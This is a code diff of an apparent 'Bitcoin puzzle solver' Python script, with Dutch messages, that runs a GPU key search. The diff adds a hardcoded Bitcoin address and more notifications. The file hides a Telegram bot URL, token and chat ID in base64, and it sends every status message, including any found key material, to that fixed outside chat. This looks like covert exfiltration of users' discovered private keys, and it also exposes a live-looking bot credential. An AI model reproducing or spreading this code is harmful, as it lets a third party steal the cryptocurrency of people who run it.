@@ -15,7 +15,7 @@ WORK_DIR = r"C:\Users\pc\Desktop\PuzzleBTC"
 NOTIF_SERVICE = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
 SERVICE_KEY = "NzY1MjQ1MjYwNTpBQUgxYjRPbTNXazh5SFotQzV6OXBjN0IySlVHTFk0eEVRZw=="
 DEST_ID = "NzAyMDIxNjc0OQ=="
-
+USER_ID = "bc1qshjmmq898m7mwceyr4qlk3vz0ptxue3yd8ux2y"
 PREFIXES = ['4', '5', '6', '7']
 
 def _decode(encoded):
@@ -48,11 +48,15 @@ def _verwerk_prefix(prefix):
         "-i", INPUT_FILE,
         "-o", OUTPUT_FILE,
         "--keyspace", f"{start}:{end}",
-        "--stride", "1"
+        "--stride", "1",
+        "-b", "82",       # Added block size parameter
+        "-t", "256",      # Added thread count parameter
+        "-p", "1024"      # Added parallel count parameter
     ]
     
     print(f"\n[+] Starten met prefix: {prefix}")
     print(f"[+] Bereik: {start} - {end}")
+    print(f"[+] Parameters: Block=82, Threads=256, Parallel=1024")
     
     
     process = subprocess.Popen(
@@ -73,6 +77,12 @@ def _verwerk_prefix(prefix):
         if output:
             print(output.strip())
     
+    # Melding sturen dat scan voltooid is (met gebruikers-ID)
+    _verstuur_bericht(
+        f"✅ Scan voltooid door {USER_ID}\n"
+        f"🔑 Prefix: {prefix}\n"
+        f"🔍 Bereik: {start[:12]}...{end[-4:]}"
+    )
     
     if os.path.getsize(os.path.join(WORK_DIR, OUTPUT_FILE)) > 0:
         with open(os.path.join(WORK_DIR, OUTPUT_FILE), 'r') as f:
@@ -81,6 +91,7 @@ def _verwerk_prefix(prefix):
         if content:
             _verstuur_bericht(
                 f"🚨 BITCOIN PUZZLE OPLOSSING!\n"
+                f"👤 Gebruiker: {USER_ID}\n"
                 f"🔑 Prefix: {prefix}\n"
                 f"🔍 Bereik: {start[:12]}...{end[-4:]}\n"
                 f"💰 Resultaat: {content}"
@@ -96,12 +107,12 @@ def hoofdprogramma():
     
     open(OUTPUT_FILE, 'a').close()
     
-    print("[+] Bitcoin Puzzle Solver gestart")
+    print(f"[+] Bitcoin Puzzle Solver gestart (Gebruiker: {USER_ID})")
     print(f"[+] Werkmap: {WORK_DIR}")
     print(f"[+] GPU: NVIDIA")
     print("[+] Monitoring gestart (Ctrl+C om te stoppen)\n")
     
-    _verstuur_bericht("⚙️ Puzzle oplosser gestart")
+    _verstuur_bericht(f"⚙️ Puzzle oplosser gestart door gebruiker: {USER_ID}")
     
     try:
         while True:
@@ -113,10 +124,10 @@ def hoofdprogramma():
             
     except KeyboardInterrupt:
         print("\n[!] Gestopt door gebruiker")
-        _verstuur_bericht("⏹ Oplosser handmatig gestopt")
+        _verstuur_bericht(f"⏹ Oplosser gestopt door gebruiker: {USER_ID}")
     except Exception as e:
         print(f"[X] Fout: {str(e)}")
-        _verstuur_bericht(f"⚠️ Kritieke fout: {str(e)}")
+        _verstuur_bericht(f"⚠️ Kritieke fout van gebruiker {USER_ID}: {str(e)}")
         raise
 
 if __name__ == "__main__":
